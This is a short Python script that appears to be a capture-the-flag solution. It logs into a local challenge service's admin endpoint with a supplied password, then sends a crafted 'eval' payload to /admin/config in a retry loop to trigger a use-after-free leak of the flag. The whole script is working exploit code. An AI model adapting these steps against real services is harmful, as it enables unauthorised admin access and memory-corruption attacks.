import json
import time

import requests

# change this to the password you get
pwd = '492bcf8f-bb9a-45b7-8d7d-91e30a8177a2'

url = 'http://localhost:12345'
s = requests.session()

# step 2: bypass xff.
r = s.post(url+'/admin/login', json={"name": "admin", "password": pwd})
print(r.text)

# step 3: UAF leak (not stable, try hard :).
for i in range(10):
    try:
        r = s.post(url+'/admin/config', json={
            "eval": "set_config(\"//////////////////////////////////////////\");set_config(\"//////////////////////////////////////////\");set_config(\"//////////////////////////////////////////\");set_config(\"//////////////////////////////////////////\");set_config(\"//////////////////////////////////////////\");set_config(\"//////////////////////////////////////////\");\"flag,flag,flag,flag,flag,flag,flag,flag,flag,flag,11111111111111111111111111111111111\""
        })
        if 'nono' in r.text:
            print(r.text)
        time.sleep(0.5)
    except:
        continue
